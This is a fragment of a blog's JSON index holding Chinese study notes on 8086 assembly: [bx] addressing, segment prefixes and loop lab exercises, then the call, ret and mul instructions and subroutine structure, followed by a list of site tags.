将偏移地址送入bx中，用[bx]的方式访问内存单元（比较麻烦） 在”[]”前显式给出地址所在的段寄存器，如访问2000：0单元： 123mov ax,2000hmov ds,axmov al,ds:[0] 5.5 loop和[bx]的联合应用在实际中，需要用循环处理地址连续的内存单元中的数据的问题，此时可应用“mov al,[bx]”，通过改变bx中的数值，改变访问的内存单元 5.6 段前缀可以在访问内存单元的指令中显式地给出内存单元的段地址所在的段寄存器，如 1234mov ax,ds:[bx] 或mov ax,cs:[bx] 或mov ax,ss:[bx]... 5.7 一段安全的空间在不能确定一段内存空间是否存放着重要的数据或代码时，不能随意向其中写入内容 DOS方式下，一般情况，0:200~0:2ff这段空间没有系统或其他程序的数据或代码 5.8 段前缀的使用附：实验4 [bx]和loop的使用 编程，向内存0:200~0:23f依次传送数据0~63(3FH) 12345678910111213141516ASSUME CS:CODECODE segment mov ax,0 mov ds,ax mov cx,64 mov bx,200hs: mov [bx],ax inc ax inc bx loop s mov ax,4c00h int 21hcode endsend 编程，向内存0:200~0:23f依次传送数据0~63(3FH)，程序中只能使用9条指令，9条指令中包括”mov ax,4c00h”和”int 21h” 123456789101112131415ASSUME CS:CODECODE segment mov ax,20 mov ds,ax mov cx,63 mov bx,0hs: mov [bx],bx inc bx loop s mov ax,4c00h int 21hcode endsend 下面程序的功能是将 “mov ax,4c00h”之前的指令复制到内存 12345678910111213141516ASSUME CS:CODEcode segment mov ax,CS mov ds,ax mov ax,0020h mov es,ax mov bx,0 mov cx,17hs: mov al,[bx] mov es:[bx],al inc bx loop s mov ax,4c00h int 21hcode endsend （17h是先设定一个值，到debug中看内存中程序的长度才得到的） 如有错误，还望指正","link":"/2022/01/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%883%EF%BC%89-BX-%E5%92%8Cloop%E6%8C%87%E4%BB%A4/"},{"title":"汇编语言（八） CALL和RET指令","text":"10.1 ret和retfret指令用栈中的数据，修改IP的内容，从而实现近转移 retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移 CPU执行ret指令时，进行下面两步操作： （1）(IP)=((ss)*16+(sp)) （2）(sp)=(sp)+2 CPU执行retf指令时，进行下面4步操作： （1）(IP)=((ss)*16+(sp)) （2）(sp)=(sp)+2 （3）(CS)=((ss)*16+(sp)) （4）(sp)=(sp)+2 通过汇编语法理解： ret相当于 1pop IP retf相当于 12pop IPpop CS 10.2 call指令CPU执行call指令时，进行两步操作 将当前IP或CS和IP压入栈中 转移 call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令原理相同 具体方法见以下几节 10.3 依据位移进行转移的call指令1call 标号;将当前IP压栈后，转到标号处执行指令 CPU操作过程： (sp)=(sp)-2 ((ss)*16+(sp)=(IP)) (IP)=(IP)+16位位移 相当于： 12push IPjmp near ptr 标号 10.4 转移的目的地址在指令中的call指令1call far ptr 标号 ;实现段间转移 CPU操作过程： (sp)=(sp)-2 ((ss)*16+(sp)=(CS)) (sp)=(sp)-2 ((ss)*16+(sp)=(IP)) (CS)=标号所在段地址 (IP)=标号在段中的偏移地址 相当于： 123push CSpush IPjmp far ptr 标号 10.5 转移地址在寄存器中的call指令1call 16位reg CPU操作过程： (sp)=(sp)-2 ((ss)*16+(sp))=(IP) (IP)=(16位reg) 相当于： 12push IPjmp 16位reg 10.6 转移地址在内存中的call指令两种格式： 1call word ptr 内存单元地址 执行该指令时相当于： 12push IPjmp word ptr 内存单元地址 另外一种： 1call dword ptr 内存单元地址 执行该指令时相当于： 123push CSpush IPjmp dword ptr 内存单元地址 10.7 call和ret的配合使用利用call和ret实现子程序的机制，具有子程序的源程序框架如下： 1234567891011121314151617181920assume cs:codecode segment main: ; ; call sub1 ;调用子程序sub1 ; ; mov ax,4c00h int 21h sub1: ; 子程序sub1开始 ; call sub2 ;调用子程序sub2 ; ret ;子程序返回 sub2: ; 子程序sub2开始 ; ; ret code ends end main 10.8 mul指令mul为乘法指令，注意以下两点： 格式如下： 1234mul regmul 内存单元;mul byte ptr ds:[0]mul word ptr [bx+si+8] 例如：计算100*10000 123mov ax,100mov bx,10000mul bx 10.9 模块化程序设计利用call和ret指令，相关问题见以下几节 10.10 参数和结果传递的问题使用寄存器和堆栈来传递参数和结果 10.11 批量数据的传递传递批量数据时，可以传递内存空间的首地址代替 10.12 寄存器冲突的问题问题：子程序中使用的寄存器，很可能在主程序中也要使用，造成了寄存器使用上的冲突 基于原则： 不发生寄存器冲突 编写调用子程序的程序的时候不必关心子程序到底使用了哪些寄存器 编写子程序的时候不必关心调用者使用了哪些寄存器 提出解决方法： 在子程序开始前将相关寄存器的值保存起来，在返回前将其恢复，可以使用栈实现。 注：该章测试点挺有意思，值得回看 实验十","link":"/2022/03/05/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E5%85%AB%EF%BC%89-CALL%E5%92%8CRET%E6%8C%87%E4%BB%A4/"}],"tags":[{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Reverse","slug":"Reverse","link":"/tags/Reverse/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"汇编语言","slug":"汇编语言","link":"/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RE","slug":"RE","link":"/tags/RE/"},{"name":"DES","slug":"DES","link":"/tags/DES/"},{"name":"CopperSmith","slug":"CopperSmith","link":"/tags/CopperSmith/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"re","slug":"re","link":"/tags/re/"},{"name":"SMC","slug":"SMC","link":"/tags/SMC/"},{"name":"Re","slug":"Re","link":"/tags/Re/"},{"name":"angr","slug":"angr","link":"/tags/angr/"},{"name":"预备知识","slug":"预备知识","link":"/tags/%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/"},{"name":"参考资料","slug":"参考资料","link":"/tags/%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/"}],"categories":[]}